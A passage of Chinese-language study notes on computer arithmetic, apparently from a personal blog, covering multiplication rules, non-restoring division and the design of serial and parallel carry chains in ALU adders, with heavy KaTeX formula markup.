乘法小结</h5><p>介绍了原码乘法和补码乘法后，总结如下：</p><ul><li>整数乘法与小数乘法完全相同，可用逗号代替小数点</li><li>原码乘符号位单独处理；补码乘符号位自然形成</li><li>原码乘去掉符号位运算，即为无符号数乘法</li><li>不同的乘法运算需有不同的硬件支持</li></ul><h4 id="除法运算"><a class="markdownIt-Anchor" href="#除法运算"></a> 除法运算</h4><p>除法运算分为恢复除数法和不恢复除数法。恢复除数法即使用加法器不断的作负数补码的加法来试探减法，一旦结果小于0则恢复除数，右移一位继续。这种做法降低了计算的效率，所以我们这里只介绍不恢复余数法。两种除法均为原码运算，故符号位需要单独处理。</p><p>不恢复余数法的步骤可以概括如下，大抵和前面介绍的乘法原码计算步骤类似：</p><p>（注意，y*表示y的绝对值）</p><ol><li>列出被除数（也即余数，比如0.1011）、商（当n=4的情况下，初始化为0.0000）</li><li>首先加上[-y*]<sub>原</sub>，即被除数减去除数，判断是否溢出</li><li>如果余数的符号位为1，小于0：<ul><li>上商0</li><li>商与余数均逻辑左移一位</li><li>+[y*]<sub>原</sub>，即加上除数</li></ul></li><li>如果余数的符号位为0，大于0：<ul><li>上商1</li><li>商与余数均逻辑左移一位</li><li>+[-y*]<sub>原</sub>，即继续减去除数</li></ul></li><li>这个步骤重复上商n+1次，总共需要逻辑左移n次，用移位的次数判断除法是否结束</li><li>符号位最后单独进行异或运算</li></ol><p>下面给出例题作为参考：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618171714654.png" alt="image-20240618171714654" style="zoom:50%;" /><p>补码的除法运算这里略过不讲，期末大概不会考它。</p><h3 id="快速进位链"><a class="markdownIt-Anchor" href="#快速进位链"></a> 快速进位链</h3><p>我们已经在数学层面上学习了如何实现计算机的运算，接下来我们来讨论如何在硬件层面上设计计算机的运算系统，这里主要以ALU加法器为例。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618193730404.png" alt="image-20240618193730404" style="zoom:50%;" /><p>其中，A和B是输入变量，可以通过设置k工作信号的值，来选择ALU的功能，最后把结果输出到F。ALU没有记忆，因此需要在A、B和F处连接寄存器储存变量的值。在ALU中，最核心的组成部分就是快速进位链，接下来我们来学习如何设计快速进位链。</p><h4 id="并行加法器"><a class="markdownIt-Anchor" href="#并行加法器"></a> 并行加法器</h4><p>并行加法器由若干个全加器构成：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618194314793.png" alt="image-20240618194314793" /></p><p>其中A和B是输入，C是进位信号，S是当前位数运算的值。可以看到，当操作的位数变多时，每一级的运算结果都要依赖于上一级的进位信号才能输出正确的结果，导致大部分时间前端的全加器都在等待，这是不可接受的。我们的任务就是优化计算进位的速度，也就是设计快速进位链。</p><p>根据全加器的逻辑表达式，我们可以很简单的构造出进位信号C的逻辑表达式：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><msub><mi>d</mi><mi>i</mi></msub><mo>+</mo><msub><mi>t</mi><mi>i</mi></msub><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C=d_i+t_iC_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>的含义图中均已给出。</p><p>根据C的表达式，我们就可以将逐级进位的结构转换为进位链的方式来实现快速进位。目前的进位链形式有<strong>串行</strong>和<strong>并行</strong>两种。</p><h4 id="串行进位链"><a class="markdownIt-Anchor" href="#串行进位链"></a> 串行进位链</h4><p>串行进位链就是指并行加法器中的进位信号通过串行传输，如图：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618195152707.png" alt="image-20240618195152707" /></p><p>进位表达式可写为：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>0</mn></msub><mo>=</mo><msub><mi>d</mi><mn>0</mn></msub><mo>+</mo><msub><mi>t</mi><mn>0</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mover accent="true"><mrow><mover accent="true"><msub><mi>d</mi><mn>0</mn></msub><mo stretchy="true">‾</mo></mover><mo>⋅</mo><mover accent="true"><mrow><msub><mi>t</mi><mn>0</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow><mo stretchy="true">‾</mo></mover></mrow><mo stretchy="true">‾</mo></mover></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>t</mi><mn>1</mn></msub><msub><mi>C</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><msub><mi>t</mi><mn>2</mn></msub><msub><mi>C</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><msub><mi>d</mi><mn>3</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>C</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}C_{0}=d_{0}+t_{0} C_{-1}=\overline{\overline{d_{0}} \cdot \overline{t_{0} C_{-1}}} \\C_{1}=d_{1}+t_{1} C_{0} \\C_{2}=d_{2}+t_{2} C_{1} \\C_{3}=d_{3}+t_{3} C_{2}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.05444em;vertical-align:-2.27722em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.7772200000000002em;"><span style="top:-4.777220000000001em;"><span class="pstrut" style="height:3.09444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.09444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.89444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.81444em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span><span style="top:-4.0144400000000005em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span><span style="top:-3.57722em;"><span class="pstrut" style="height:3.09444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.3772200000000003em;"><span class="pstrut" style="height:3.09444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.1772200000000004em;"><span class="pstrut" style="height:3.09444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.27722em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></p><p>即我们先通过与非门计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">t_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>，再和低电平<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">d_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>信号通过一次与非门就能得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">C_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，同理可求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">C_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，设计出进位链。</p><p>让我们假设与非门的延迟是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9011879999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，那么n位全加器产生进位的全部时间就为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>n</mi><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">2nt_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">2</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，因为一个进位需要使用两个与非门。</p><h4 id="并行进位链"><a class="markdownIt-Anchor" href="#并行进位链"></a> 并行进位链</h4><p>并行进位链，又称先行进位或跳跃进位，是指并行加法器的进位信号理想情况下是同时产生的，但这么实现通常有困难。一般来说有两种实现方案：<strong>单重分组</strong>和<strong>双重分组</strong>。</p><p>我们之前得到了串行进位链的进位信号表达式，对该表达式进行变换，可以得到如下结果：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>0</mn></msub><mo>=</mo><msub><mi>d</mi><mn>0</mn></msub><mo>+</mo><msub><mi>t</mi><mn>0</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>t</mi><mn>1</mn></msub><msub><mi>C</mi><mn>0</mn></msub><mo>=</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>t</mi><mn>1</mn></msub><msub><mi>d</mi><mn>0</mn></msub><mo>+</mo><msub><mi>t</mi><mn>1</mn></msub><msub><mi>t</mi><mn>0</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" 